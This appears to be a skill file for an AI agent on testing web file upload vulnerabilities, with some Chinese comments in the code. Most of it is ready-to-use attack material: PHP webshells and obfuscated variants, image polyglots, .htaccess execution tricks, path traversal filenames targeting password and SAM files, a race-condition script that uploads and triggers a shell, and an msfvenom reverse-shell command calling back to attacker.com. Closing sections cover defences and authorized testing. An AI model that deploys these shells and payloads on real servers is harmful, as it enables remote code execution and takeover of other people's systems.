---
name: file-upload-testing
description: Professional skills and methodology for file upload vulnerability testing
version: 1.0.0
---

# File Upload Vulnerability Testing

## Overview

File upload functionality is common in web applications but carries multiple security risks. This skill provides methods for detecting, exploiting, and preventing file upload vulnerabilities.

## Vulnerability Types

### 1. Unvalidated File Type

**Client-side validation only:**
```javascript
// 可被绕过
if (!file.name.endsWith('.jpg')) {
  alert('只允许上传图片');
}
```

### 2. Unvalidated File Content

**Extension check only:**
```php
// 危险代码
if (pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION) == 'jpg') {
  move_uploaded_file($_FILES['file']['tmp_name'], 'uploads/' . $filename);
}
```

### 3. Path Traversal

**Unfiltered file names:**
```
filename: ../../../etc/passwd
filename: ..\..\..\windows\system32\config\sam
```

### 4. File Name Overwrite

**Predictable file names:**
```
uploads/1.jpg
uploads/2.jpg
```

## Testing Methodology

### 1. Basic Detection

**Test various file types:**
- .php, .jsp, .asp, .aspx
- .php3, .php4, .php5, .phtml
- .jspx, .jspf
- .htaccess, .htpasswd

**Test double extensions:**
```
shell.php.jpg
shell.jpg.php
```

**Test case variations:**
```
shell.PHP
shell.PhP
```

### 2. Content-Type Bypass

**Modifying the Content-Type:**
```
Content-Type: image/jpeg
# 但文件内容是PHP代码
```

**Magic bytes:**
```php
// 在PHP代码前添加图片头
GIF89a<?php phpinfo(); ?>
```

### 3. Parsing Vulnerabilities

**Apache parsing vulnerability:**
```
shell.php.xxx  # Apache可能解析为PHP
```

**IIS parsing vulnerability:**
```
shell.asp;.jpg
shell.asp:.jpg
```

**Nginx parsing vulnerability:**
```
shell.jpg%00.php
```

### 4. Race Conditions

**Accessing the file immediately after upload:**
```python
# 上传.php文件，在上传完成但删除前访问
import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>')}
    requests.post('http://target.com/upload', files=files)

def access():
    time.sleep(0.1)
    requests.get('http://target.com/uploads/shell.php?cmd=id')

threading.Thread(target=upload).start()
threading.Thread(target=access).start()
```

## Exploitation Techniques

### PHP WebShell

**Basic webshell:**
```php
<?php system($_GET['cmd']); ?>
```

**One-line webshell:**
```php
<?php eval($_POST['a']); ?>
```

**Bypassing filters:**
```php
<?php
$_GET['cmd']($_POST['a']);
// 使用: ?cmd=system
```

### .htaccess Exploitation

**Uploading .htaccess:**
```
AddType application/x-httpd-php .jpg
```

**Then upload shell.jpg (which is actually PHP code)**

### Image Shells (Polyglots)

**GIF image shell:**
```php
GIF89a
<?php
phpinfo();
?>
```

**PNG image shell:**
```bash
# 使用工具将PHP代码嵌入PNG
python3 png2php.py shell.php shell.png
```

### Chaining with File Inclusion

**If a file inclusion vulnerability exists:**
```
# 上传包含PHP代码的图片
# 然后通过文件包含执行
?file=uploads/shell.jpg
```

## Bypass Techniques

### Extension Bypass

**Double extensions:**
```
shell.php.jpg
shell.php;.jpg
shell.php%00.jpg
```

**Case variations:**
```
shell.PHP
shell.PhP
```

**Special characters:**
```
shell.php.
shell.php 
shell.php%20
```

### Content-Type Bypass

**Modifying request headers:**
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
```

### Magic Bytes Bypass

**Adding file headers:**
```php
// JPEG
\xFF\xD8\xFF\xE0<?php phpinfo(); ?>

// GIF
GIF89a<?php phpinfo(); ?>

// PNG
\x89\x50\x4E\x47<?php phpinfo(); ?>
```

### Code Obfuscation

**Using short tags:**
```php
<?= system($_GET['cmd']); ?>
```

**Using variables:**
```php
<?php
$a='sys';
$b='tem';
$a.$b($_GET['cmd']);
```

## Tool Usage

### Burp Suite

1. Intercept the file upload request
2. Modify the file name and content
3. Test various bypass techniques

### Upload Bypass

```bash
# 使用各种技术测试文件上传
python upload_bypass.py -u http://target.com/upload -f shell.php
```

### WebShell Generation

```bash
# 生成各种WebShell
msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker.com LPORT=4444 -f raw > shell.php
```

## Verification and Reporting

### Verification Steps

1. Confirm that a malicious file can be uploaded
2. Verify that the file can be executed
3. Assess the impact (command execution, data leakage, etc.)
4. Document a complete PoC
5. Use the `report_finding` tool to record confirmed vulnerabilities in the platform (the sole entry point for recording vulnerabilities in this platform); the fields cover location, type, severity, reproduction steps/PoC, and remediation recommendations

### Report Essentials

- Vulnerability location and upload functionality
- File types that can be uploaded and how they are executed
- Complete exploitation steps and PoC
- Remediation recommendations (file type validation, content inspection, secure storage, etc.)

## Protective Measures

### Recommended Solutions

1. **File type whitelist**
   ```python
   ALLOWED_EXTENSIONS = {'jpg', 'png', 'gif'}
   ext = filename.rsplit('.', 1)[1].lower()
   if ext not in ALLOWED_EXTENSIONS:
       raise ValueError("File type not allowed")
   ```

2. **File content validation**
   ```python
   import magic
   file_type = magic.from_buffer(file_content, mime=True)
   if not file_type.startswith('image/'):
       raise ValueError("Invalid file content")
   ```

3. **Rename files**
   ```python
   import uuid
   filename = str(uuid.uuid4()) + '.' + ext
   ```

4. **Isolated storage**
   - Store files outside the web root
   - Serve files through a proxy script
   - Disable execute permissions

5. **File scanning**
   - Scan with antivirus software
   - Inspect file content
   - Remove executable permissions

6. **Size limits**
   ```python
   MAX_SIZE = 5 * 1024 * 1024  # 5MB
   if file.size > MAX_SIZE:
       raise ValueError("File too large")
   ```

## Important Notes

- Only test in authorized testing environments
- Avoid uploading malicious files to production environments
- Clean up promptly after testing
- Be aware of parsing differences across servers
